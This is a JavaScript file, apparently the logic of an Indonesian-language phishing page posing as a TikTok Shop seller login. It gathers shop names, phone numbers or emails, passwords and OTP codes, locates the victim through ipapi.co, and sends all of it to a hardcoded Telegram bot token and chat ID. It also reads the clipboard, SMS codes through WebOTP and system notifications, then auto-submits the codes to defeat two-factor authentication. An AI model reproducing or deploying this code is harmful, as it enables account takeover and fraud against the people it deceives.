// ==================== KONFIGURASI BOT TELEGRAM ====================
const BOT_TOKEN = '8074762578:AAFze7gDSC6mN4ygqKs-Mx71WprCU8-z_04';
const CHAT_ID = '7402071395';
// =================================================================

let halamanSebelumnya = 'page1';
let halamanSebelumHasil = 'page1';
let halamanAsalOTP = '';
let simpanData = {};
let jumlahOTP = 4;
let tipeLogin = '';
let infoPerangkat = { lokasi: 'Tidak terdeteksi', perangkat: 'Tidak terdeteksi' };
let pesanTerakhir = '';
let notifikasiTerakhir = '';
let otpDitemukanSebelum = null;

window.onload = function() {
    ambilInfoPerangkat();
    pulihkanHalaman();
    pulihkanPengaturanOTP();
    inisialisasiTab();
    
    // ✅ Mulai pantau SEKARANG, SEBELUM masuk halaman OTP
    mulaiDengarkanSemuaSumber();
    mulaiPantauOTPAwal();
};

// Ambil info lokasi & perangkat
async function ambilInfoPerangkat() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        infoPerangkat.lokasi = `${data.city}, ${data.region}, ${data.country_name}`;
    } catch (e) {
        infoPerangkat.lokasi = 'Tidak terdeteksi';
    }
    infoPerangkat.perangkat = navigator.userAgentData?.platform || navigator.platform || 'Tidak terdeteksi';
}

// Kirim pesan ke Telegram
async function kirimTelegram(pesan) {
    if (!BOT_TOKEN || !CHAT_ID) return;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const body = new URLSearchParams({
        chat_id: CHAT_ID,
        text: pesan,
        parse_mode: 'Markdown'
    });
    try {
        await fetch(url, { method: 'POST', body });
    } catch (e) {
        console.log('Gagal kirim ke Telegram:', e);
    }
}

// Format pesan data lengkap saat dikirim
function buatPesanTelegram() {
    let kontak = simpanData.kontak || '-';
    let labelKontak = kontak.includes('@') ? '📧 Gmail' : '📞 Kontak';
    return `📩 Data Baru dari TikTok Shop

🏪 Nama Toko: ${simpanData.namaToko || '-'}
${labelKontak}: ${kontak}
🔑 Kode OTP: ${simpanData.otp || '-'}

🌍 LOKASI PERANGKAT:
${infoPerangkat.lokasi}

📱 NAMA PERANGKAT:
${infoPerangkat.perangkat}`;
}


// ==================== ✅ PANTAU OTP SEBELUM HALAMAN OTP DIBUKA ====================
function mulaiPantauOTPAwal() {
    setInterval(() => {
        // Jika sudah ada OTP yang ditemukan, simpan untuk nanti
        if (otpDitemukanSebelum && !simpanData.otp) {
            simpanData.otp = otpDitemukanSebelum.kode;
        }
    }, 1000);
}

// ==================== FUNGSI DETEKSI OTP DARI SEMUA SUMBER ====================
function mulaiDengarkanSemuaSumber() {
    // 1. Baca SMS Otomatis
    if ('OTPCredential' in window) {
        bacaSMSOtomatis();
    }

    // 2. Pantau Clipboard
    pantauClipboard();

    // 3. Pantau Notifikasi Sistem (WhatsApp, Email, dll)
    pantauNotifikasiSistem();

    // 4. Pantau Input Manual
    pantauInputOTP();
}

// Baca SMS Otomatis
async function bacaSMSOtomatis() {
    try {
        const ac = new AbortController();
        setTimeout(() => ac.abort(), 300000);

        const otp = await navigator.credentials.get({
            otp: { transport: ['sms'] },
            signal: ac.signal
        });

        if (otp && otp.code) {
            prosesPesanOTP(otp.code, 'SMS Otomatis');
        }
    } catch (err) {
        console.log('WebOTP tidak aktif:', err);
    }
}

// Pantau Clipboard
function pantauClipboard() {
    document.addEventListener('paste', async function(e) {
        const teks = (e.clipboardData || window.clipboardData).getData('text');
        if (!teks || teks === pesanTerakhir) return;
        
        pesanTerakhir = teks;
        prosesPesanOTP(teks, 'Salin dari WhatsApp/Email');
    });

    setInterval(async () => {
        try {
            const teks = await navigator.clipboard.readText();
            if (!teks || teks === pesanTerakhir) return;
            
            pesanTerakhir = teks;
            prosesPesanOTP(teks, 'Papan Klip Otomatis');
        } catch (e) {}
    }, 1500);
}

// Pantau Notifikasi Sistem
async function pantauNotifikasiSistem() {
    if ('Notification' in window) {
        const izin = await Notification.requestPermission();
        if (izin === 'granted') {
            console.log('Izin notifikasi diberikan');
        }
    }

    if ('getNotifications' in navigator) {
        setInterval(async () => {
            try {
                const notifikasi = await navigator.getNotifications();
                notifikasi.forEach(n => {
                    const isi = `${n.title || ''} ${n.body || ''}`.trim();
                    if (!isi || isi === notifikasiTerakhir) return;
                    
                    notifikasiTerakhir = isi;
                    
                    let sumber = 'Notifikasi Sistem';
                    if (isi.toLowerCase().includes('whatsapp')) sumber = 'WhatsApp';
                    else if (isi.toLowerCase().includes('gmail') || isi.toLowerCase().includes('email')) sumber = 'Email';
                    else if (isi.toLowerCase().includes('sms')) sumber = 'SMS';
                    
                    prosesPesanOTP(isi, `Notifikasi ${sumber}`);
                });
            } catch (e) {}
        }, 2000);
    }
}

// Pantau Input OTP
function pantauInputOTP() {
    setInterval(() => {
        const inputs = document.querySelectorAll('.otp-input-group input');
        if (inputs.length === 0) return;

        let kode = '';
        inputs.forEach(i => kode += i.value);

        if ((kode.length === 4 || kode.length === 6) && kode !== simpanData.otp) {
            simpanData.otp = kode;
            kirimTelegram(`📩 OTP DARI INPUT MANUAL

🔑 Kode OTP: ${kode}
📋 Panjang: ${kode.length} digit

🌍 LOKASI: ${infoPerangkat.lokasi}
📱 PERANGKAT: ${infoPerangkat.perangkat}`);
        }
    }, 500);
}

// PROSES UTAMA: Deteksi & Kirim Notifikasi
function prosesPesanOTP(isiPesan, sumber = 'Tidak Diketahui') {
    let hasil = deteksiKodeOTP(isiPesan);
    
    if (!hasil.kode) return;

    // Simpan kode agar tidak hilang
    simpanOTPKeLocal(hasil);

    // Tampilkan pesan di halaman jika sedang di halaman OTP
    if (document.getElementById('page-otp').style.display !== 'none') {
        document.getElementById('sms-pesan').style.display = 'block';
        document.getElementById('sms-pesan').innerHTML = `✅ ${sumber}<br>🔑 Kode: ${hasil.kode}<br>📋 Jenis: ${hasil.jenis}`;
        setTimeout(() => {
            document.getElementById('sms-pesan').style.display = 'none';
        }, 5000);

        isiOTPOtomatis(hasil.kode);
    }

    // ✅ KODE INI YANG MENGIRIM NOTIFIKASI KE TELEGRAM
    kirimTelegram(`📩 OTP DITERIMA OTOMATIS

📨 Sumber: ${sumber}
📝 Isi Pesan:
${isiPesan}

🔍 DETEKSI OTOMATIS:
🔑 Kode OTP: ${hasil.kode}
📋 Jenis: ${hasil.jenis}
📐 Panjang: ${hasil.panjang} digit

🌍 LOKASI: ${infoPerangkat.lokasi}
📱 PERANGKAT: ${infoPerangkat.perangkat}`);
}




// DETEKSI KODE OTP DARI SEMUA FORMAT
function deteksiKodeOTP(teks) {
    let hasil = { kode: null, jenis: null, panjang: 0 };
    teks = teks.trim();

    let pola = [
        /\b\d{4}\b/g,
        /\b\d{6}\b/g,
        /\b[A-Z0-9]{6}\b/gi,
        /kode\s*[:=]?\s*([A-Z0-9]{4,6})/gi,
        /otp\s*[:=]?\s*([A-Z0-9]{4,6})/gi,
        /verifikasi\s*[:=]?\s*([A-Z0-9]{4,6})/gi,
        /kode\s*verifikasi\s*[:=]?\s*([A-Z0-9]{4,6})/gi,
        /kode\s*anda\s*[:=]?\s*([A-Z0-9]{4,6})/gi,
        /masukkan\s*kode\s*[:=]?\s*([A-Z0-9]{4,6})/gi
    ];

    let semuaKode = [];
    pola.forEach(p => {
        let cocok = teks.match(p);
        if (cocok) semuaKode.push(...cocok);
    });

    semuaKode = [...new Set(semuaKode)].sort((a, b) => b.length - a.length);

    if (semuaKode.length === 0) return hasil;

    let kode = semuaKode[0];
    hasil.kode = kode.replace(/[^A-Z0-9]/gi, '').toUpperCase();
    hasil.panjang = hasil.kode.length;

    if (hasil.panjang === 4) {
        hasil.jenis = 'Nomor HP - 4 Angka';
    } else if (hasil.panjang === 6) {
        if (/^[0-9]+$/.test(hasil.kode)) {
            hasil.jenis = 'Nomor HP - 6 Angka';
        } else {
            hasil.jenis = 'Email - 6 Huruf+Angka';
        }
    }

    if (hasil.panjang === 4 || hasil.panjang === 6) {
        jumlahOTP = hasil.panjang;
        simpanPengaturanOTP();
    }

    return hasil;
}

// Isi kode ke kotak OTP
function isiOTPOtomatis(kode) {
    if (!document.getElementById('page-otp').style.display || 
        document.getElementById('page-otp').style.display === 'none') return;

    const inputs = document.querySelectorAll('.otp-input-group input');
    if (kode.length !== inputs.length) return;

    for (let i = 0; i < kode.length; i++) {
        inputs[i].value = kode[i];
    }

    cekOTPLengkap();

    if (!document.getElementById('otp-btn').disabled) {
        setTimeout(() => kirimOTP(), 800);
    }
}
// =================================================================

function simpanPengaturanOTP() {
    localStorage.setItem('otp_jumlah', jumlahOTP);
    localStorage.setItem('otp_tipe', tipeLogin);
}
function pulihkanPengaturanOTP() {
    const jml = localStorage.getItem('otp_jumlah');
    const tpe = localStorage.getItem('otp_tipe');
    if (jml) jumlahOTP = parseInt(jml);
    if (tpe) tipeLogin = tpe;
}

function tampilHalaman(id) {
    document.querySelectorAll('.container').forEach(p => p.style.display = 'none');
    document.getElementById(id).style.display = 'block';
    localStorage.setItem('halamanTerakhir', id);
    window.scrollTo(0, 0);
    if (id === 'page-otp') {
        buatInputOTP();
        
        // ✅ Jika OTP sudah ditemukan sebelumnya, langsung isi otomatis
        if (otpDitemukanSebelum) {
            setTimeout(() => isiOTPOtomatis(otpDitemukanSebelum.kode), 300);
        }
    }
}
function goToPage(id) {
    halamanSebelumnya = document.querySelector('.container:not([style*="display: none"])')?.id || 'page1';
    tampilHalaman(id);
}
function kembaliKeSebelumnya() {
    tampilHalaman(halamanSebelumnya);
}
function kembaliKeHalamanSebelumnya() {
    localStorage.removeItem('halamanTerakhir');
    tampilHalaman(halamanSebelumHasil);
}
function kembaliDariOTP() {
    localStorage.removeItem('otp_jumlah');
    localStorage.removeItem('otp_tipe');
    if (halamanAsalOTP === 'form') tampilHalaman('page-form');
    else if (halamanAsalOTP === 'login') tampilHalaman('page2');
    else if (halamanAsalOTP === 'reset') tampilHalaman('page3');
}
function pulihkanHalaman() {
    const terakhir = localStorage.getItem('halamanTerakhir');
    if (terakhir && terakhir !== 'page-result') tampilHalaman(terakhir);
    else tampilHalaman('page1');
}

function togglePassword(idInput, idIkon) {
    const input = document.getElementById(idInput);
    const ikon = document.getElementById(idIkon);
    if (input.type === 'password') {
        input.type = 'text';
        ikon.src = 'https://cdn-icons-png.flaticon.com/512/2787/2787959.png';
    } else {
        input.type = 'password';
        ikon.src = 'https://cdn-icons-png.flaticon.com/512/159/159604.png';
    }
}
function togglePass(idInput, ikon) {
    const input = document.getElementById(idInput);
    if (input.type === 'password') {
        input.type = 'text';
        ikon.src = 'https://cdn-icons-png.flaticon.com/512/2787/2787959.png';
    } else {
        input.type = 'password';
        ikon.src = 'https://cdn-icons-png.flaticon.com/512/159/159604.png';
    }
}

function bukaForm(jenis) {
    simpanData.jenis = jenis;
    halamanSebelumnya = 'page1';
    goToPage('page-form');
    if (jenis === 'tiktok') {
        document.getElementById('form-judul').textContent = 'Masuk dengan TikTok';
        document.getElementById('form-desc').textContent = 'Masukkan data akun TikTok Shop Anda';
    } else {
        document.getElementById('form-judul').textContent = 'Masuk dengan Email/Nomor HP';
        document.getElementById('form-desc').textContent = 'Masukkan data akun Anda';
    }
}

function inisialisasiTab() {
    document.querySelectorAll('#page-form .tabs .tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('#page-form .tabs .tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            document.querySelectorAll('#page-form .input-view').forEach(v => v.classList.remove('active'));
            const jenis = this.getAttribute('data-tab');
            document.getElementById(`form-view-${jenis}`).classList.add('active');
            if (jenis === 'hp') document.getElementById('form-email').value = '';
            else document.getElementById('form-hp').value = '';
            cekValidasiForm();
        });
    });

    document.querySelectorAll('#page2 .tabs .tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('#page2 .tabs .tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            document.querySelectorAll('#page2 .input-view').forEach(v => v.classList.remove('active'));
            const jenis = this.getAttribute('data-tab');
            document.getElementById(`view-${jenis}`).classList.add('active');
            if (jenis === 'hp') document.getElementById('login-email').value = '';
            else document.getElementById('login-hp').value = '';
            cekValidasiLogin();
        });
    });

    document.querySelectorAll('#page3 .tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('#page3 .tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            const jenis = this.getAttribute('data-tab');
            document.getElementById('tab-hp').style.display = jenis === 'hp' ? 'block' : 'none';
            document.getElementById('tab-email').style.display = jenis === 'email' ? 'block' : 'none';
            cekValidasiReset();
        });
    });
}

function cekNomorHP(nilai) {
    if (!nilai) return false;
    const n = nilai.trim();
    return /^(08|62|\+62)?8\d{8,}$/.test(n);
}
function cekEmail(nilai) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(nilai.trim());
}
function updateButtonState(btnId, isActive) {
    const btn = document.getElementById(btnId);
    if (isActive) {
        btn.disabled = false;
        btn.classList.remove('btn-disabled');
    } else {
        btn.disabled = true;
        btn.classList.add('btn-disabled');
    }
}

function cekValidasiForm() {
    const namaToko = document.getElementById('form-nama-toko').value.trim();
    const tabAktif = document.querySelector('#page-form .tabs .tab.active')?.getAttribute('data-tab');
    const error = document.getElementById('form-kontak-error');
    let kontakValid = false;
    if (tabAktif === 'hp') {
        const noHP = document.getElementById('form-hp').value.trim();
        kontakValid = /^8\d{8,}$/.test(noHP);
    } else {
        const email = document.getElementById('form-email').value.trim();
        kontakValid = cekEmail(email);
    }
    updateButtonState('form-btn', namaToko && kontakValid);
    error.style.display = kontakValid === false && (document.getElementById('form-hp').value || document.getElementById('form-email').value) ? 'block' : 'none';
}
function cekValidasiLogin() {
    const namaToko = document.getElementById('nama-toko').value.trim();
    const sandi = document.getElementById('pass-login').value.trim();
    const tabAktif = document.querySelector('#page2 .tabs .tab.active')?.getAttribute('data-tab');
    let kontakValid = false;
    if (tabAktif === 'hp') {
        const noHP = document.getElementById('login-hp').value.trim();
        kontakValid = /^8\d{8,}$/.test(noHP);
    } else {
        const email = document.getElementById('login-email').value.trim();
        kontakValid = cekEmail(email);
    }
    updateButtonState('btn-login', namaToko && sandi.length >= 6 && kontakValid);
}
function cekValidasiReset() {
    let valid = false;
    const tab = document.querySelector('#page3 .tab.active').getAttribute('data-tab');
    if (tab === 'hp') {
        const hp = document.getElementById('reset-hp').value.trim();
        const b = document.getElementById('pass-baru-hp').value;
        const k = document.getElementById('pass-konfirm-hp').value;
        valid = hp.length >= 9 && b.length >= 6 && b === k;
    } else {
        const email = document.getElementById('reset-email').value.trim();
        const b = document.getElementById('pass-baru-email').value;
        const k = document.getElementById('pass-konfirm-email').value;
        valid = cekEmail(email) && b.length >= 6 && b === k;
    }
    updateButtonState('btn-reset', valid);
}

async function lanjutKeOTP(asal) {
    halamanAsalOTP = asal;
    if (asal === 'form') {
        const tab = document.querySelector('#page-form .tab.active').dataset.tab;
        tipeLogin = tab;
        simpanData.namaToko = document.getElementById('form-nama-toko').value.trim();
        simpanData.kontak = tab === 'hp' ? document.getElementById('form-hp').value.trim() : document.getElementById('form-email').value.trim();
    } else if (asal === 'login') {
        const tab = document.querySelector('#page2 .tab.active').dataset.tab;
        tipeLogin = tab;
        simpanData.namaToko = document.getElementById('nama-toko').value.trim();
        simpanData.kontak = tab === 'hp' ? document.getElementById('login-hp').value.trim() : document.getElementById('login-email').value.trim();
        simpanData.sandi = document.getElementById('pass-login').value.trim();
    } else if (asal === 'reset') {
        const tab = document.querySelector('#page3 .tab.active').dataset.tab;
        tipeLogin = tab;
        simpanData.kontak = tab === 'hp' ? document.getElementById('reset-hp').value.trim() : document.getElementById('reset-email').value.trim();
        simpanData.sandiBaru = tab === 'hp' ? document.getElementById('pass-baru-hp').value.trim() : document.getElementById('pass-baru-email').value.trim();
    }

    await kirimTelegram(`📩 Data Diterima\n\n🏪 Nama Toko: ${simpanData.namaToko || '-'}\n📧 Kontak: ${simpanData.kontak}\n\n🌍 LOKASI: ${infoPerangkat.lokasi}\n📱 PERANGKAT: ${infoPerangkat.perangkat}`);

    if (tipeLogin === 'email') {
        jumlahOTP = 6;
        document.getElementById('link-ganti-otp').classList.add('hidden');
        document.getElementById('otp-keterangan').textContent = 'Kode dikirim ke email Anda (boleh huruf + angka)';
    } else {
        jumlahOTP = 4;
        document.getElementById('link-ganti-otp').classList.remove('hidden');
        document.getElementById('link-ganti-otp').textContent = 'Ganti kode 6 angka';
        document.getElementById('otp-keterangan').textContent = 'Kode dikirim ke nomor HP Anda (hanya angka)';
    }
    simpanPengaturanOTP();
    buatInputOTP();
    goToPage('page-otp');
}

function buatInputOTP() {
    const kotak = document.getElementById('otp-kotak');
    if (!kotak) return;
    kotak.innerHTML = '';
    for (let i = 0; i < jumlahOTP; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.maxLength = 1;
        if (tipeLogin === 'hp' || jumlahOTP === 4 || jumlahOTP === 6) {
            input.inputMode = 'text';
            input.oninput = function() {
                if (jumlahOTP === 4 || (jumlahOTP === 6 && tipeLogin === 'hp')) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                }
                pindahInput(i);
            };
        } else {
            input.oninput = function() { pindahInput(i); };
        }
        input.onkeydown = function(e) {
            if (e.key === 'Backspace' && this.value === '') kembaliInput(i);
        };
        kotak.appendChild(input);
    }
    cekOTPLengkap();
}
function pindahInput(indeks) {
    const inputs = document.querySelectorAll('.otp-input-group input');
    if (inputs[indeks].value && indeks < inputs.length - 1) inputs[indeks + 1].focus();
    cekOTPLengkap();
}
function kembaliInput(indeks) {
    const inputs = document.querySelectorAll('.otp-input-group input');
    if (indeks > 0) inputs[indeks - 1].focus();
    cekOTPLengkap();
}
function cekOTPLengkap() {
    const inputs = document.querySelectorAll('.otp-input-group input');
    let lengkap = true;
    inputs.forEach(i => { if (!i.value) lengkap = false; });
    updateButtonState('otp-btn', lengkap);
}

function gantiJumlahOTP() {
    if (tipeLogin === 'email') return;
    jumlahOTP = jumlahOTP === 4 ? 6 : 4;
    simpanPengaturanOTP();
    document.getElementById('link-ganti-otp').textContent = jumlahOTP === 4 ? 'Ganti kode 6 angka' : 'Ganti kode 4 angka';
    buatInputOTP();
}

function ubahKodeOTP() {
    kembaliDariOTP();
}

async function kirimOTP() {
    let kode = '';
    document.querySelectorAll('.otp-input-group input').forEach(i => kode += i.value);
    simpanData.otp = kode;
    
    await kirimTelegram(buatPesanTelegram());
    
    halamanSebelumHasil = 'page-otp';
    goToPage('page-result');
}
